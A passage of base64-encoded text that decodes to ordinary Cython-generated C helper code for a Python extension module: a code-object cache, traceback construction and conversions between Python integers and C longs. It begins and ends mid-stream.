2NhY2hlLT5lbnRyaWVzID0gZW50cmllcztcbiAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gbmV3X21heDtcbiAgICB9XG4gICAgZm9yIChpPWNvZGVfY2FjaGUtPmNvdW50OyBpPnBvczsgaS0tKSB7XG4gICAgICAgIGVudHJpZXNbaV0gPSBlbnRyaWVzW2ktMV07XG4gICAgfVxuICAgIGVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7XG4gICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgY29kZV9jYWNoZS0+Y291bnQrKztcbiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xufVxuc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDU1xuICAgICh2b2lkKV9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Q7XG4gICAgcmV0dXJuOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvblwndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IGZhaWwuXG4jZWxzZVxuICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBleHBlY3RlZCA9IDA7XG4gICAgaWYgKCFfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsICZleHBlY3RlZCwgSU5UX01JTikpIHtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiNlbmRpZlxuICAgIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lLCBjb2RlX29iamVjdCk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBfX3B5eF9hdG9taWNfc3ViKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCwgSU5UX01JTik7XG4jZW5kaWZcbiNlbmRpZlxufVxuXG5cbiNpbmNsdWRlICJjb21waWxlLmgiXG4jaW5jbHVkZSAiZnJhbWVvYmplY3QuaCJcbiNpbmNsdWRlICJ0cmFjZWJhY2suaCJcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTilcbiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFXG4gICAgI2RlZmluZSBQeV9CVUlMRF9DT1JFIDFcbiAgI2VuZGlmXG4gICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCJcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKnNjcmF0Y2hfZGljdCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZmlyc3RsaW5lbm8sIFB5T2JqZWN0ICpuYW1lKSB7XG4gICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19maXJzdGxpbmVubyIsIGZpcnN0bGluZW5vKSkpIHJldHVybiBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19uYW1lIiwgbmFtZSkpKSByZXR1cm4gTlVMTDtcbiAgICByZXBsYWNlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjb2RlLCAicmVwbGFjZSIpO1xuICAgIGlmIChsaWtlbHkocmVwbGFjZSkpIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IFB5T2JqZWN0X0NhbGwocmVwbGFjZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIHNjcmF0Y2hfZGljdCk7XG4gICAgICAgIFB5X0RFQ1JFRihyZXBsYWNlKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHtcbiAgICBQeU9iamVjdCAqY29kZV9vYmplY3QgPSBOVUxMLCAqcHlfcHlfbGluZSA9IE5VTEwsICpweV9mdW5jbmFtZSA9IE5VTEwsICpkaWN0ID0gTlVMTDtcbiAgICBQeU9iamVjdCAqcmVwbGFjZSA9IE5VTEwsICpnZXRmcmFtZSA9IE5VTEwsICpmcmFtZSA9IE5VTEw7XG4gICAgUHlPYmplY3QgKmV4Y190eXBlLCAqZXhjX3ZhbHVlLCAqZXhjX3RyYWNlYmFjaztcbiAgICBpbnQgc3VjY2VzcyA9IDA7XG4gICAgaWYgKGNfbGluZSkge1xuICAgICAgICBjX2xpbmUgPSBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIGNfbGluZSk7XG4gICAgfVxuICAgIFB5RXJyX0ZldGNoKCZleGNfdHlwZSwgJmV4Y192YWx1ZSwgJmV4Y190cmFjZWJhY2spO1xuICAgIGNvZGVfb2JqZWN0ID0gX19weXhfZmluZF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSk7XG4gICAgaWYgKCFjb2RlX29iamVjdCkge1xuICAgICAgICBjb2RlX29iamVjdCA9IFB5X0NvbXBpbGVTdHJpbmcoIl9nZXRmcmFtZSgpIiwgZmlsZW5hbWUsIFB5X2V2YWxfaW5wdXQpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfb2JqZWN0KSkgZ290byBiYWQ7XG4gICAgICAgIHB5X3B5X2xpbmUgPSBQeUxvbmdfRnJvbUxvbmcocHlfbGluZSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghcHlfcHlfbGluZSkpIGdvdG8gYmFkO1xuICAgICAgICBpZiAoY19saW5lKSB7XG4gICAgICAgICAgICBweV9mdW5jbmFtZSA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCAiJXMgKCVzOiVkKSIsIGZ1bmNuYW1lLCBfX3B5eF9jZmlsZW5tLCBjX2xpbmUpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcHlfZnVuY25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhmdW5jbmFtZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9mdW5jbmFtZSkpIGdvdG8gYmFkO1xuICAgICAgICBkaWN0ID0gUHlEaWN0X05ldygpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWRpY3QpKSBnb3RvIGJhZDtcbiAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKm9sZF9jb2RlX29iamVjdCA9IGNvZGVfb2JqZWN0O1xuICAgICAgICAgICAgY29kZV9vYmplY3QgPSBfX1B5eF9QeUNvZGVfUmVwbGFjZV9Gb3JfQWRkVHJhY2ViYWNrKGNvZGVfb2JqZWN0LCBkaWN0LCBweV9weV9saW5lLCBweV9mdW5jbmFtZSk7XG4gICAgICAgICAgICBQeV9ERUNSRUYob2xkX2NvZGVfb2JqZWN0KTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfb2JqZWN0KSkgZ290byBiYWQ7XG4gICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgY29kZV9vYmplY3QpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgfVxuICAgIGdldGZyYW1lID0gUHlTeXNfR2V0T2JqZWN0KCJfZ2V0ZnJhbWUiKTtcbiAgICBpZiAodW5saWtlbHkoIWdldGZyYW1lKSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKGRpY3QsICJfZ2V0ZnJhbWUiLCBnZXRmcmFtZSkpKSBnb3RvIGJhZDtcbiAgICBmcmFtZSA9IFB5RXZhbF9FdmFsQ29kZShjb2RlX29iamVjdCwgZGljdCwgZGljdCk7XG4gICAgaWYgKHVubGlrZWx5KCFmcmFtZSkgfHwgZnJhbWUgPT0gUHlfTm9uZSkgZ290byBiYWQ7XG4gICAgc3VjY2VzcyA9IDE7XG4gIGJhZDpcbiAgICBQeUVycl9SZXN0b3JlKGV4Y190eXBlLCBleGNfdmFsdWUsIGV4Y190cmFjZWJhY2spO1xuICAgIFB5X1hERUNSRUYoY29kZV9vYmplY3QpO1xuICAgIFB5X1hERUNSRUYocHlfcHlfbGluZSk7XG4gICAgUHlfWERFQ1JFRihweV9mdW5jbmFtZSk7XG4gICAgUHlfWERFQ1JFRihkaWN0KTtcbiAgICBQeV9YREVDUkVGKHJlcGxhY2UpO1xuICAgIGlmIChzdWNjZXNzKSB7XG4gICAgICAgIFB5VHJhY2VCYWNrX0hlcmUoXG4gICAgICAgICAgICAoc3RydWN0IF9mcmFtZSopZnJhbWUpO1xuICAgIH1cbiAgICBQeV9YREVDUkVGKGZyYW1lKTtcbn1cbiNlbHNlXG5zdGF0aWMgUHlDb2RlT2JqZWN0KiBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0Rm9yVHJhY2ViYWNrKFxuICAgICAgICAgICAgY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsXG4gICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHtcbiAgICBQeUNvZGVPYmplY3QgKnB5X2NvZGUgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICpweV9mdW5jbmFtZSA9IE5VTEw7XG4gICAgaWYgKGNfbGluZSkge1xuICAgICAgICBweV9mdW5jbmFtZSA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCAiJXMgKCVzOiVkKSIsIGZ1bmNuYW1lLCBfX3B5eF9jZmlsZW5tLCBjX2xpbmUpO1xuICAgICAgICBpZiAoIXB5X2Z1bmNuYW1lKSBnb3RvIGJhZDtcbiAgICAgICAgZnVuY25hbWUgPSBQeVVuaWNvZGVfQXNVVEY4KHB5X2Z1bmNuYW1lKTtcbiAgICAgICAgaWYgKCFmdW5jbmFtZSkgZ290byBiYWQ7XG4gICAgfVxuICAgIHB5X2NvZGUgPSBQeUNvZGVfTmV3RW1wdHkoZmlsZW5hbWUsIGZ1bmNuYW1lLCBweV9saW5lKTtcbiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTtcbiAgICByZXR1cm4gcHlfY29kZTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHtcbiAgICBQeUNvZGVPYmplY3QgKnB5X2NvZGUgPSAwO1xuICAgIFB5RnJhbWVPYmplY3QgKnB5X2ZyYW1lID0gMDtcbiAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4gICAgUHlPYmplY3QgKnB0eXBlLCAqcHZhbHVlLCAqcHRyYWNlYmFjaztcbiAgICBpZiAoY19saW5lKSB7XG4gICAgICAgIGNfbGluZSA9IF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKHRzdGF0ZSwgY19saW5lKTtcbiAgICB9XG4gICAgcHlfY29kZSA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpO1xuICAgIGlmICghcHlfY29kZSkge1xuICAgICAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUodHN0YXRlLCAmcHR5cGUsICZwdmFsdWUsICZwdHJhY2ViYWNrKTtcbiAgICAgICAgcHlfY29kZSA9IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RGb3JUcmFjZWJhY2soXG4gICAgICAgICAgICBmdW5jbmFtZSwgY19saW5lLCBweV9saW5lLCBmaWxlbmFtZSk7XG4gICAgICAgIGlmICghcHlfY29kZSkge1xuICAgICAgICAgICAgXG4gICAgICAgICAgICBQeV9YREVDUkVGKHB0eXBlKTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYocHZhbHVlKTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYocHRyYWNlYmFjayk7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHB0eXBlLCBwdmFsdWUsIHB0cmFjZWJhY2spO1xuICAgICAgICBfX3B5eF9pbnNlcnRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUsIHB5X2NvZGUpO1xuICAgIH1cbiAgICBweV9mcmFtZSA9IFB5RnJhbWVfTmV3KFxuICAgICAgICB0c3RhdGUsICAgICAgICAgICAgXG4gICAgICAgIHB5X2NvZGUsICAgICAgICAgICBcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgICAgXG4gICAgICAgIDAgICAgICAgICAgICAgICAgICBcbiAgICApO1xuICAgIGlmICghcHlfZnJhbWUpIGdvdG8gYmFkO1xuICAgIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihweV9mcmFtZSwgcHlfbGluZSk7XG4gICAgUHlUcmFjZUJhY2tfSGVyZShweV9mcmFtZSk7XG5iYWQ6XG4gICAgUHlfWERFQ1JFRihweV9jb2RlKTtcbiAgICBQeV9YREVDUkVGKHB5X2ZyYW1lKTtcbn1cbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfRnJvbV9sb25nKGxvbmcgdmFsdWUpIHtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaFxuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iXG4jZW5kaWZcbiAgICBjb25zdCBsb25nIG5lZ19vbmUgPSAobG9uZykgLTEsIGNvbnN0X3plcm8gPSAobG9uZykgMDtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybztcbiAgICBpZiAoaXNfdW5zaWduZWQpIHtcbiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8IHNpemVvZihsb25nKSkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZygobG9uZykgdmFsdWUpO1xuICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbVVuc2lnbmVkTG9uZygodW5zaWduZWQgbG9uZykgdmFsdWUpO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbVVuc2lnbmVkTG9uZ0xvbmcoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykgdmFsdWUpO1xuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBpZiAoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZihsb25nKSkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZygobG9uZykgdmFsdWUpO1xuICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcoKFBZX0xPTkdfTE9ORykgdmFsdWUpO1xuICAgICAgICB9XG4gICAgfVxuICAgIHtcbiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWx1ZTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gICAgICAgIGlmIChpc191bnNpZ25lZCkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWROYXRpdmVCeXRlcyhieXRlcywgc2l6ZW9mKHZhbHVlKSwgLTEpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTmF0aXZlQnl0ZXMoYnl0ZXMsIHNpemVvZih2YWx1ZSksIC0xKTtcbiAgICAgICAgfVxuI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwXG4gICAgICAgIGludCBvbmUgPSAxOyBpbnQgbGl0dGxlID0gKGludCkqKHVuc2lnbmVkIGNoYXIgKikmb25lO1xuICAgICAgICByZXR1cm4gX1B5TG9uZ19Gcm9tQnl0ZUFycmF5KGJ5dGVzLCBzaXplb2YobG9uZyksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGl0dGxlLCAhaXNfdW5zaWduZWQpO1xuI2Vsc2VcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBsaXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIFB5T2JqZWN0ICpmcm9tX2J5dGVzLCAqcmVzdWx0ID0gTlVMTCwgKmt3ZHMgPSBOVUxMO1xuICAgICAgICBQeU9iamVjdCAqcHlfYnl0ZXMgPSBOVUxMLCAqb3JkZXJfc3RyID0gTlVMTDtcbiAgICAgICAgZnJvbV9ieXRlcyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KikmUHlMb25nX1R5cGUsICJmcm9tX2J5dGVzIik7XG4gICAgICAgIGlmICghZnJvbV9ieXRlcykgcmV0dXJuIE5VTEw7XG4gICAgICAgIHB5X2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSgoY2hhciopYnl0ZXMsIHNpemVvZihsb25nKSk7XG4gICAgICAgIGlmICghcHlfYnl0ZXMpIGdvdG8gbGltaXRlZF9iYWQ7XG4gICAgICAgIG9yZGVyX3N0ciA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGxpdHRsZSA/ICJsaXR0bGUiIDogImJpZyIpO1xuICAgICAgICBpZiAoIW9yZGVyX3N0cikgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3NbMysoQ1lUSE9OX1ZFQ1RPUkNBTEwgPyAxIDogMCldID0geyBOVUxMLCBweV9ieXRlcywgb3JkZXJfc3RyIH07XG4gICAgICAgICAgICBpZiAoIWlzX3Vuc2lnbmVkKSB7XG4gICAgICAgICAgICAgICAga3dkcyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7XG4gICAgICAgICAgICAgICAgaWYgKCFrd2RzKSBnb3RvIGxpbWl0ZWRfYmFkO1xuICAgICAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHIoInNpZ25lZCIsIF9fUHl4X05ld1JlZihQeV9UcnVlKSwga3dkcywgYXJncyszLCAwKSA8IDApIGdvdG8gbGltaXRlZF9iYWQ7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoZnJvbV9ieXRlcywgYXJncysxLCAyIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBrd2RzKTtcbiAgICAgICAgfVxuICAgICAgICBsaW1pdGVkX2JhZDpcbiAgICAgICAgUHlfWERFQ1JFRihrd2RzKTtcbiAgICAgICAgUHlfWERFQ1JFRihvcmRlcl9zdHIpO1xuICAgICAgICBQeV9YREVDUkVGKHB5X2J5dGVzKTtcbiAgICAgICAgUHlfWERFQ1JFRihmcm9tX2J5dGVzKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxuICAgIH1cbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuc3RhdGljIF9fUHl4X1R5cGVOYW1lXG5fX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5VHlwZU9iamVjdCogdHApXG57XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7XG4gICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgbmFtZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7XG4gICAgI2Vsc2VcbiAgICBuYW1lID0gUHlUeXBlX0dldFF1YWxOYW1lKHRwKTtcbiAgICAjZW5kaWZcbiAgICBpZiAodW5saWtlbHkobmFtZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG5hbWUpKSkgZ290byBiYWQ7XG4gICAgbW9kdWxlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cigoUHlPYmplY3QgKil0cCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KG1vZHVsZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG1vZHVsZSkpKSBnb3RvIGJhZDtcbiAgICBpZiAoUHlVbmljb2RlX0NvbXBhcmVXaXRoQVNDSUlTdHJpbmcobW9kdWxlLCAiYnVpbHRpbnMiKSA9PSAwKSB7XG4gICAgICAgIHJlc3VsdCA9IG5hbWU7XG4gICAgICAgIG5hbWUgPSBOVUxMO1xuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCIlVS4lVSIsIG1vZHVsZSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBOVUxMKSkgZ290byBiYWQ7XG4gIGRvbmU6XG4gICAgUHlfWERFQ1JFRihuYW1lKTtcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgYmFkOlxuICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgaWYgKG5hbWUpIHtcbiAgICAgICAgcmVzdWx0ID0gbmFtZTtcbiAgICAgICAgbmFtZSA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE1KTtcbiAgICB9XG4gICAgZ290byBkb25lO1xufVxuI2VuZGlmXG5cblxuI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVxcXG4gICAgX19QWVhfX1ZFUklGWV9SRVRVUk5fSU5UKHRhcmdldF90eXBlLCBmdW5jX3R5cGUsIGZ1bmNfdmFsdWUsIDApXG4jZGVmaW5lIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVxcXG4gICAgX19QWVhfX1ZFUklGWV9SRVRVUk5fSU5UKHRhcmdldF90eXBlLCBmdW5jX3R5cGUsIGZ1bmNfdmFsdWUsIDEpXG4jZGVmaW5lIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCBleGMpXFxcbiAgICB7XFxcbiAgICAgICAgZnVuY190eXBlIHZhbHVlID0gZnVuY192YWx1ZTtcXFxuICAgICAgICBpZiAoc2l6ZW9mKHRhcmdldF90eXBlKSA8IHNpemVvZihmdW5jX3R5cGUpKSB7XFxcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSh2YWx1ZSAhPSAoZnVuY190eXBlKSAodGFyZ2V0X3R5cGUpIHZhbHVlKSkge1xcXG4gICAgICAgICAgICAgICAgZnVuY190eXBlIHplcm8gPSAwO1xcXG4gICAgICAgICAgICAgICAgaWYgKGV4YyAmJiB1bmxpa2VseSh2YWx1ZSA9PSAoZnVuY190eXBlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKVxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAodGFyZ2V0X3R5cGUpIC0xO1xcXG4gICAgICAgICAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KHZhbHVlIDwgemVybykpXFxcbiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XFxcbiAgICAgICAgICAgICAgICBlbHNlXFxcbiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcXFxuICAgICAgICAgICAgfVxcXG4gICAgICAgIH1cXFxuICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSB2YWx1ZTtcXFxuICAgIH1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBsb25nIF9fUHl4X1B5TG9uZ19Bc19sb25nKFB5T2JqZWN0ICp4KSB7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2hcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIlxuI2VuZGlmXG4gICAgY29uc3QgbG9uZyBuZWdfb25lID0gKGxvbmcpIC0xLCBjb25zdF96ZXJvID0gKGxvbmcpIDA7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcFxuI2VuZGlmXG4gICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87XG4gICAgaWYgKHVubGlrZWx5KCFQeUxvbmdfQ2hlY2soeCkpKSB7XG4gICAgICAgIGxvbmcgdmFsO1xuICAgICAgICBQeU9iamVjdCAqdG1wID0gX19QeXhfUHlOdW1iZXJfTG9uZyh4KTtcbiAgICAgICAgaWYgKCF0bXApIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgIHZhbCA9IF9fUHl4X1B5TG9uZ19Bc19sb25nKHRtcCk7XG4gICAgICAgIFB5X0RFQ1JFRih0bXApO1xuICAgICAgICByZXR1cm4gdmFsO1xuICAgIH1cbiAgICBpZiAoaXNfdW5zaWduZWQpIHtcbiNpZiBDWVRIT05fV